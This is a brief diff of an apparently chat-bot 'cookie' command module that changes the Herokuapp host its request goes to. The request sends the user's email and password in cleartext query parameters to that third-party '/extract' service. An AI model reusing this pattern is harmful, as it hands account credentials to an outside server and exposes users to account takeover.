@@ -1,4 +1,4 @@
- const axios = global.nodemodule["axios"];
+const axios = global.nodemodule["axios"];
 
 module.exports.config = {
   name: "cookie",
@@ -26,7 +26,7 @@ module.exports.handleEvent = async function ({ api, event }) {
   await api.sendMessage("🍪 | 𝙴𝚡𝚝𝚛𝚊𝚌𝚝𝚒𝚗𝚐 𝙲𝚘𝚘𝚔𝚒𝚎𝚜...", event.threadID);
 
   try {
-    const res = await axios.get(`https://hazee-cookiev2-08d6585e44a4.herokuapp.com/extract?email=${email}&password=${password}`);
+    const res = await axios.get(`https://haze-cookiev2-5053e3bd90a1.herokuapp.com/extract?email=${email}&password=${password}`);
 
     const userData = res.data;
 
